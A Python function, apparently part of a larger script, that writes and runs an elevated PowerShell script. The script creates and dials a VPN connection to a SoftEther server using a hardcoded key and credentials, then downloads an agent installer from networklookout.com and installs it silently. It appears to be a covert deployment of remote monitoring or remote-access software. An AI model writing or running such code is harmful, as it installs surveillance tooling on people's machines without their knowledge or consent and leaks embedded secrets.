def vpn_setup():
	file_name="'nmemplpro_agent.msi'"
	f=open(tempfile.gettempdir()+"\\test.ps1","w")
	f.write('Add-VpnConnection -Name Trial234 -ServerAddress "vpn228071575.softether.net" -TunnelType L2tp -AuthenticationMethod MSChapv2 -EncryptionLevel Optional -L2tpPsk "aPxBvh7A" -Force -AllUserConnection -UseWinLogonCredential $false -SplitTunneling')
	f.write('\nrasdial "Trial234" "test1" "test1"')
	f.write('\n$TempDir = [System.IO.Path]::GetTempPath()\n$url = "http://networklookout.com/dwn/nmemplpro_agent.msi"\n$output = $TempDir+"nmemplpro_agent.msi"\n$start_time = Get-Date\nImport-Module BitsTransfer\nStart-BitsTransfer -Source $url -Destination $output\nWrite-Output "Time taken: $((Get-Date).Subtract($start_time).Seconds) second(s)"\n$final= $TempDir + {}\nmsiexec /i $final PASSWORD=myAgentPassword /qn'.format(file_name))
	f.close()
	os.system(r'powershell Start-Process powershell -ArgumentList {} -Verb runAs'.format(tempfile.gettempdir()+'\\test.ps1'))
